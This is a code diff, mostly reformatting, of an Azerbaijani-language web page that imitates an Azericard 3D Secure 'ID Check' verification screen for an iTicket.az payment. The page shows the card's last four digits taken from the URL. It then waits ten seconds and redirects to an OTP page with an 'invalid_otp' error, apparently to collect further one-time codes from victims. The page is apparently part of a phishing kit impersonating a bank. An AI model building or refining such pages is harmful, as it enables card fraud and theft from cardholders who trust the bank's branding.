@@ -6,25 +6,8 @@
     <title>Azericard - Yoxlanılır</title>
     <style>
         * { box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f4f7f6;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .card {
-            background: #fff;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
-            width: 100%;
-            max-width: 420px;
-            padding: 40px 30px;
-            text-align: center;
-        }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { background: #fff; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); width: 100%; max-width: 420px; padding: 40px 30px; text-align: center; }
         .logos { display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 30px; }
         .logos img { height: 28px; }
         .logos span { font-size: 18px; color: #555; font-weight: 300; }
@@ -38,7 +21,6 @@
         .details span:first-child { font-weight: 700; color: #555; }
         .details strong { color: #0d6efd; font-weight: 700; letter-spacing: 0.5px; }
         .footer { font-size: 12.5px; color: #666; line-height: 1.6; font-weight: 500; margin-top: 15px; }
-        .footer .shield { font-size: 14px; }
     </style>
 </head>
 <body>
@@ -48,18 +30,15 @@
             <span>|</span>
             <span class="id-check">ID Check</span>
         </div>
-
         <div class="spinner"></div>
         <h2>Zəhmət olmasa gözləyin,<br>məlumatlarınız yoxlanılır...</h2>
-
         <div class="details">
             <div><span>Əməliyyat:</span> <strong>iTicket.az</strong></div>
             <div><span>Tarix:</span> <strong id="dateField"></strong></div>
             <div><span>Kart:</span> <strong id="cardField">**** **** **** 0000</strong></div>
         </div>
-
         <div class="footer">
-            <span class="shield">🛡️</span> Bu səhifə, onlayn əməliyyatınızı təhlükəsiz etmək üçün 3D Secure texnologiyasından istifadə edir.
+            🛡️ Bu səhifə, onlayn əməliyyatınızı təhlükəsiz etmək üçün 3D Secure texnologiyasından istifadə edir.
         </div>
     </div>
 
@@ -75,7 +54,6 @@
             document.getElementById('cardField').innerText = '**** **** **** ' + cardParam.replace(/\s/g, '').slice(-4);
         }
 
-        // 10 saniyə sonra OTP səhifəsinə geri qayıdırıq (xəta ilə)
         setTimeout(function() {
             window.location.href = 'azericard-3ds.html?card=' + encodeURIComponent(cardParam) + '&amount=' + encodeURIComponent(amountParam) + '&error=invalid_otp';
         }, 10000);
